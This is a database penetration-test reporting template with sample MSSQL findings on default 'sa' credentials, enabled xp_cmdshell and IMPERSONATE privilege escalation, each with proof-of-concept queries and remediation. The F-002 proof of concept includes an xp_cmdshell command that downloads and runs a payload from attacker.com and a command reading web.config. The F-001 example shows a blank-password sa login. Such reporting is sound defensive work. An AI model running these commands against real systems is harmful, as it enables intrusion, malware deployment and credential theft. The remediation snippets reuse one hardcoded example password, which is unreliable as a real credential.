# Database Penetration Test Reporting Template

Standardized format for documenting findings from database security assessments. Use this template to ensure consistent, high-quality reporting across engagements.

Related: [[DB-02-Technical-Testing-Checklist]] | [[DB-03-Query-Tracker]] | [[DB-04-Evidence-Collection]]

---

## Report Structure

1. Executive Summary
2. Assessment Overview
3. Findings Summary
4. Detailed Findings
5. Recommendations
6. Appendices

---

## Executive Summary

**Purpose**: High-level overview for non-technical stakeholders (C-suite, DBAs, business owners)

**Length**: 1-2 pages max

**Include**:
- Testing scope and objectives
- Key findings (Critical/High only)
- Overall risk rating
- Business impact summary
- Top 3-5 recommendations

**Tone**: Business-focused, avoid excessive technical jargon

---

### Executive Summary Template

```
EXECUTIVE SUMMARY

[Client Name] engaged [Your Company] to conduct a security assessment of their 
[Database Platform] database server(s) from [Start Date] to [End Date]. The assessment 
identified [X] security vulnerabilities, including [Y] Critical and [Z] High 
severity findings.

KEY FINDINGS:
The most significant security risks identified include:

1. Default Credentials - The 'sa' account uses default credentials, allowing 
   immediate administrative access to all databases.
   
2. Operating System Command Execution - The xp_cmdshell feature is enabled, 
   allowing attackers to execute arbitrary operating system commands.
   
3. Privilege Escalation - Low-privilege database users can escalate to 'sa' 
   via impersonation vulnerabilities.

BUSINESS IMPACT:
These vulnerabilities could result in:
- Complete database compromise (all data accessible)
- Data exfiltration of customer PII/PHI (estimated [X] records)
- Ransomware deployment via database-to-OS command execution
- Lateral movement to other systems via linked servers
- Regulatory non-compliance (HIPAA, PCI-DSS, GDPR)

RECOMMENDATIONS:
Immediate action items to reduce risk:
1. Change all default credentials immediately
2. Disable xp_cmdshell and other dangerous extended procedures
3. Implement principle of least privilege for all database accounts
4. Enable and monitor database audit logging
5. Encrypt database connections (enforce TLS/SSL)

OVERALL RISK RATING: [CRITICAL / HIGH / MEDIUM]

A detailed breakdown of findings and remediation guidance follows in this report.
```

---

## Assessment Overview

### Engagement Details

| Field | Value |
|-------|-------|
| **Client** | [Company Name] |
| **Database System** | [Platform and Version] |
| **Server(s) Tested** | [Hostname(s)/IP(s)] |
| **Assessment Type** | Black Box / Gray Box / White Box |
| **Testing Period** | [Start Date] - [End Date] |
| **Total Effort** | [X hours] |
| **Tester(s)** | [Name(s)] |
| **Report Date** | [Date] |
| **Report Version** | [v1.0] |

### Scope

**In Scope**:
- [Database server 1 - IP/hostname]
- [Database server 2 - IP/hostname]
- [Database instance/name]
- [Specific databases tested]

**Out of Scope**:
- [Production database server (if applicable)]
- [Specific excluded systems]

### Testing Methodology

The assessment followed industry best practices and included:

1. **Network Enumeration** - Identified database services via port scanning
2. **Service Fingerprinting** - Determined database platform, version, and configuration
3. **Authentication Testing** - Tested for default/weak credentials and authentication bypass
4. **Authorization Testing** - Evaluated privilege escalation and access control
5. **Configuration Review** - Assessed security settings and dangerous features
6. **Post-Exploitation** - Tested OS command execution, file access, and lateral movement
7. **Data Exfiltration** - Verified sensitive data exposure risks

Reference: [[DB-02-Technical-Testing-Checklist]]

### Testing Constraints

**Limitations**:
- [e.g., Testing performed on staging environment only]
- [e.g., High-load testing prohibited during business hours]

**Assumptions**:
- [e.g., Testing reflects current production configuration]

---

## Findings Summary

### Severity Distribution

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | X | XX% |
| High | X | XX% |
| Medium | X | XX% |
| Low | X | XX% |
| Informational | X | XX% |
| **Total** | **X** | **100%** |

### Findings by Category

| Category | Critical | High | Medium | Low | Info | Total |
|----------|----------|------|--------|-----|------|-------|
| Authentication | X | X | X | X | X | X |
| Authorization | X | X | X | X | X | X |
| Configuration | X | X | X | X | X | X |
| Encryption | X | X | X | X | X | X |
| Post-Exploitation | X | X | X | X | X | X |
| **Total** | **X** | **X** | **X** | **X** | **X** | **X** |

### Platform-Specific Issues

| Database Platform | Critical Findings | High Findings |
|------------------|-------------------|---------------|
| MSSQL | [List issues] | [List issues] |
| MySQL | [List issues] | [List issues] |
| PostgreSQL | [List issues] | [List issues] |
| MongoDB | [List issues] | [List issues] |

---

## Detailed Finding Template

Use this template for each finding.

---

### [F-XXX] Finding Title

**Severity**: Critical / High / Medium / Low / Informational

**Category**: [Authentication / Authorization / Configuration / Encryption / Post-Exploitation]

**Platform**: [MSSQL / MySQL / PostgreSQL / Oracle / MongoDB / etc.]

**Status**: Open / In Progress / Remediated

**Affected Systems**:
- [Server: hostname/IP - Database: dbname]
- [Server: hostname/IP - Database: dbname]

---

#### Description

[Clear, concise description of the vulnerability. What is the issue?]

---

#### Impact

**Technical Impact**:
- [Specific technical consequence 1]
- [Specific technical consequence 2]

**Business Impact**:
- [Business risk 1]
- [Business risk 2]

---

#### Evidence

**Screenshots**: (Reference [[DB-04-Evidence-Collection]])
- `[Engagement]_[Category]_F[###]_01_[Description].png`
- `[Engagement]_[Category]_F[###]_02_[Description].png`

**Query Tracker**: [[DB-03-Query-Tracker#QT-XXX]]

---

#### Proof of Concept

**Step-by-step reproduction**:

1. Connect to database server: `[hostname]:[port]`
2. Execute query: `[SQL command]`
3. Observe result: `[what happens]`

**SQL Query**:
```sql
[Exact query used]
```

**Expected Result**: [what should happen]

**Actual Result**: [what actually happened]

**Reproducibility**: [100% / High / Medium]

---

#### Root Cause

[Technical explanation of why the vulnerability exists]

Example: "The 'sa' account is configured with default credentials. SQL Server 
installations often leave this account with blank or weak passwords, and 
administrators may not change it post-installation."

---

#### Risk Rating Justification

**CVSS v3.1 Score**: [X.X] ([Severity])

**Vector String**: `CVSS:3.1/AV:[X]/AC:[X]/PR:[X]/UI:[X]/S:[X]/C:[X]/I:[X]/A:[X]`

**Justification**:
- Attack Vector: [Network / Adjacent / Local]
- Attack Complexity: [Low / High]
- Privileges Required: [None / Low / High]
- User Interaction: [None / Required]
- Confidentiality Impact: [High / Low / None]
- Integrity Impact: [High / Low / None]
- Availability Impact: [High / Low / None]

---

#### Recommendations

**Immediate Mitigation** (Short-term):
1. [Quick fix or workaround]
2. [Temporary control]

**Permanent Remediation** (Long-term):
1. [Configuration change]
2. [Code-level fix with example]
3. [Process improvement]

**Example Remediation**:
```sql
-- Change default credentials
ALTER LOGIN sa WITH PASSWORD = 'ComplexP@ssw0rd123!';
ALTER LOGIN sa DISABLE;  -- Consider disabling if not needed

-- Create new admin account instead
CREATE LOGIN admin_user WITH PASSWORD = 'ComplexP@ssw0rd123!';
ALTER SERVER ROLE sysadmin ADD MEMBER admin_user;
```

---

#### References

- [Vendor documentation link]
- [CWE Link]
- [Security blog post or KB article]

---

## Sample Findings

### [F-001] Default SQL Server 'sa' Account Credentials

**Severity**: Critical

**Category**: Authentication

**Platform**: Microsoft SQL Server 2019

**Affected Systems**:
- Server: SQLSERVER01 (192.168.1.50) - All databases

#### Description

The SQL Server 'sa' (system administrator) account is configured with default 
credentials (blank password). This account has full administrative privileges 
over all databases and the SQL Server instance itself.

#### Impact

**Technical Impact**:
- Full database server compromise
- Read/write/delete access to all databases
- Ability to execute operating system commands (if xp_cmdshell enabled)
- Access to linked servers and database credentials

**Business Impact**:
- Complete data breach (all customer PII/PHI accessible)
- Ransomware deployment risk (via OS command execution)
- Regulatory penalties (HIPAA, PCI-DSS violations)
- Reputational damage and loss of customer trust

#### Evidence

**Screenshots**:
- `ACME_Auth_F001_01_SA-Login-Attempt.png`
- `ACME_Auth_F001_02_SA-Access-Granted.png`
- `ACME_Auth_F001_03_Sysadmin-Privileges.png`

**Query Tracker**: [[DB-03-Query-Tracker#QT-050]]

#### Proof of Concept

**Connection Test**:
```bash
# Using Impacket mssqlclient.py
mssqlclient.py sa:@192.168.1.50 -windows-auth

# Using DBeaver
Server: 192.168.1.50
Database: master
Username: sa
Password: [blank]
```

**Verification Query**:
```sql
-- Confirm sysadmin privileges
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 1 (member)

-- List all databases
SELECT name FROM sys.databases;
-- Returns: All databases accessible

-- Check server permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
-- Returns: CONTROL SERVER (highest privilege)
```

**Result**: Full administrative access achieved with default credentials.

**Reproducibility**: 100%

#### Root Cause

SQL Server installations allow the 'sa' account to be created with a blank password, 
particularly in Express Edition installations. Many administrators do not change 
this password post-installation, especially in development/test environments that 
are later promoted to production.

#### Risk Rating

**CVSS v3.1 Score**: 9.8 (Critical)

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Justification**:
- Attack Vector: Network (remotely exploitable)
- Attack Complexity: Low (no special conditions)
- Privileges Required: None (unauthenticated access)
- User Interaction: None
- Confidentiality: High (all data accessible)
- Integrity: High (data can be modified/deleted)
- Availability: High (database can be taken offline)

#### Recommendations

**Immediate**:
1. Change 'sa' password immediately:
   ```sql
   ALTER LOGIN sa WITH PASSWORD = 'ComplexP@ssw0rd123!';
   ```
2. Disable 'sa' account if not required:
   ```sql
   ALTER LOGIN sa DISABLE;
   ```
3. Review all other SQL logins for weak passwords

**Long-term**:
1. Implement Windows Authentication instead of SQL Authentication
2. Enforce password complexity policy:
   ```sql
   ALTER LOGIN sa WITH PASSWORD = 'ComplexP@ssw0rd123!', 
   CHECK_POLICY = ON, CHECK_EXPIRATION = ON;
   ```
3. Regular password rotation (every 90 days)
4. Monitor for failed login attempts
5. Use Managed Service Accounts where possible

#### References

- [Microsoft: Securing sa Account](https://docs.microsoft.com/sql/relational-databases/security/securing-sql-server)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

### [F-002] Operating System Command Execution via xp_cmdshell

**Severity**: Critical

**Category**: Post-Exploitation

**Platform**: Microsoft SQL Server 2019

**Affected Systems**:
- Server: SQLSERVER01 (192.168.1.50)

#### Description

The extended stored procedure xp_cmdshell is enabled, allowing authenticated users 
to execute arbitrary operating system commands. This feature is disabled by default 
but has been explicitly enabled on this server.

#### Impact

**Technical Impact**:
- Execute arbitrary OS commands as SQL Server service account
- Read/write files on the server
- Deploy malware or ransomware
- Establish persistence mechanisms
- Lateral movement to other systems

**Business Impact**:
- Server compromise beyond database
- Ransomware deployment (entire server encrypted)
- Installation of backdoors for persistent access
- Pivot point for network-wide compromise

#### Proof of Concept

**Check if xp_cmdshell is enabled**:
```sql
EXEC sp_configure 'xp_cmdshell';
-- show_advanced_options = 1
-- xp_cmdshell = 1 (enabled)
```

**Execute OS commands**:
```sql
-- Check current user
EXEC xp_cmdshell 'whoami';
-- Output: NT SERVICE\MSSQLSERVER

-- List directory
EXEC xp_cmdshell 'dir C:\';

-- Read sensitive files
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';

-- Download malicious payload (example - NOT executed)
EXEC xp_cmdshell 'powershell -c "iwr http://attacker.com/payload.exe -outfile C:\temp\payload.exe"';

-- Execute payload
EXEC xp_cmdshell 'C:\temp\payload.exe';
```

**Reproducibility**: 100%

#### Recommendations

**Immediate**:
```sql
-- Disable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

**Long-term**:
1. Keep xp_cmdshell disabled unless absolutely required
2. If required, implement strict access control (sysadmin only)
3. Run SQL Server service with least privilege account
4. Monitor for xp_cmdshell usage via audit logs
5. Consider application-level alternatives to OS command execution

#### References

- [Microsoft: xp_cmdshell Documentation](https://docs.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

### [F-003] Privilege Escalation via IMPERSONATE Permission

**Severity**: High

**Category**: Authorization

**Platform**: Microsoft SQL Server 2019

#### Description

Low-privilege database users have IMPERSONATE permission on the 'sa' account, 
allowing them to execute queries with sysadmin privileges.

#### Impact

**Technical Impact**:
- Privilege escalation from regular user to sysadmin
- Full database and server compromise
- Access to all databases and data

**Business Impact**:
- Circumvention of access controls
- Insider threat amplification
- Audit trail evasion (actions appear as 'sa')

#### Proof of Concept

**As low-privilege user 'app_user'**:
```sql
-- Check current permissions
SELECT CURRENT_USER;
-- Returns: app_user

SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 0 (not sysadmin)

-- Check impersonation permissions
SELECT pe.permission_name, pe.state_desc
FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id
WHERE pr.name = 'app_user' AND pe.permission_name = 'IMPERSONATE';
-- Returns: IMPERSONATE | GRANT

-- Impersonate sa account
EXECUTE AS LOGIN = 'sa';

-- Verify elevated privileges
SELECT CURRENT_USER;
-- Returns: sa

SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 1 (now sysadmin!)

-- Execute privileged actions
EXEC xp_cmdshell 'whoami';
-- Success: OS command executed

-- Revert to original context
REVERT;
```

#### Recommendations

**Immediate**:
```sql
-- Revoke IMPERSONATE permission
USE master;
REVOKE IMPERSONATE ON LOGIN::sa TO app_user;

-- Check for other accounts with IMPERSONATE
SELECT 
    grantee.name AS grantee,
    impersonated.name AS impersonated_account,
    permission_name
FROM sys.server_permissions pe
JOIN sys.server_principals grantee ON pe.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals impersonated ON pe.major_id = impersonated.principal_id
WHERE permission_name = 'IMPERSONATE';
```

**Long-term**:
1. Never grant IMPERSONATE on privileged accounts
2. Use execution context (EXECUTE AS) only when necessary
3. Implement principle of least privilege
4. Regular permission audits

---

## Strategic Recommendations

### 1. Implement Defense-in-Depth for Database Security

**Network Layer**:
- Firewall rules restricting database port access
- Network segmentation (database servers in isolated VLAN)
- VPN or jump box required for remote access

**Authentication Layer**:
- Strong password policies (complexity, length, expiration)
- Multi-factor authentication for privileged accounts
- Windows Authentication preferred over SQL Authentication
- Disable default accounts (sa, root, postgres)

**Authorization Layer**:
- Principle of least privilege for all accounts
- Role-based access control (RBAC)
- Regular access reviews and permission audits
- Separate accounts for different applications

**Encryption Layer**:
- TLS/SSL for all database connections
- Transparent Data Encryption (TDE) for data at rest
- Column-level encryption for sensitive fields
- Encrypted backups

**Monitoring Layer**:
- Database audit logging enabled
- SIEM integration for security events
- Alerts for suspicious activity (failed logins, privilege changes)
- Regular log reviews

### 2. Disable Dangerous Features

**MSSQL**:
- xp_cmdshell (OS command execution)
- OLE Automation (COM object creation)
- Ad Hoc Distributed Queries
- CLR Integration (unless required)

**MySQL**:
- local_infile (file reading)
- FILE privilege (file read/write)
- Unnecessary user-defined functions (UDFs)

**PostgreSQL**:
- Untrusted procedural languages
- Excessive superuser accounts

**MongoDB**:
- Server-side JavaScript execution
- Bind to 0.0.0.0 (allow all IPs)

### 3. Regular Security Assessments

- Quarterly vulnerability scans
- Annual penetration tests
- Configuration reviews after major changes
- Automated compliance checks

### 4. Security Training

- DBA security training (SANS, OWASP)
- Secure configuration guides
- Incident response procedures
- Security awareness for developers

---

## Appendices

### Appendix A: Testing Methodology Detail

Full reference: [[DB-02-Technical-Testing-Checklist]]

### Appendix B: Query Library

Full reference: [[DB-03-Query-Tracker]] and [[DB-06-Quick-Reference]]

### Appendix C: Evidence Archive

All screenshots and query outputs: [[DB-04-Evidence-Collection]]

### Appendix D: Common Database Ports

| Database | Default Port(s) | Protocol |
|----------|----------------|----------|
| MSSQL | 1433 (TCP), 1434 (UDP) | TDS |
| MySQL | 3306 | TCP |
| PostgreSQL | 5432 | TCP |
| Oracle | 1521, 1522 | TCP |
| MongoDB | 27017 | TCP |
| Redis | 6379 | TCP |
| Cassandra | 9042 | TCP |
| CouchDB | 5984 | HTTP |
| Elasticsearch | 9200 | HTTP |
| DB2 | 50000 | TCP |

### Appendix E: Database Security Best Practices

**Authentication**:
- Use strong, unique passwords (minimum 14 characters)
- Implement Windows/Kerberos authentication where possible
- Enable account lockout policies
- Disable unused default accounts

**Authorization**:
- Principle of least privilege
- Regular permission audits
- Separate accounts for applications vs. administrators
- No direct sysadmin/root access for applications

**Configuration**:
- Disable unnecessary features and extended procedures
- Enable TLS/SSL for all connections
- Configure firewall rules (restrict to specific IPs)
- Keep database software patched and updated

**Auditing**:
- Enable comprehensive audit logging
- Monitor for suspicious activity
- Regular log reviews
- SIEM integration for correlation

**Backup**:
- Encrypted backups
- Secure backup storage
- Regular backup testing
- Immutable backups (ransomware protection)

---

## Tags
#reporting #findings #documentation #database-testing #pentest-report

---

## Related Documents
- [[DB-00-Overview|Overview]]
- [[DB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[DB-03-Query-Tracker|Query Tracker]]
- [[DB-04-Evidence-Collection|Evidence Collection]]
- [[DB-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
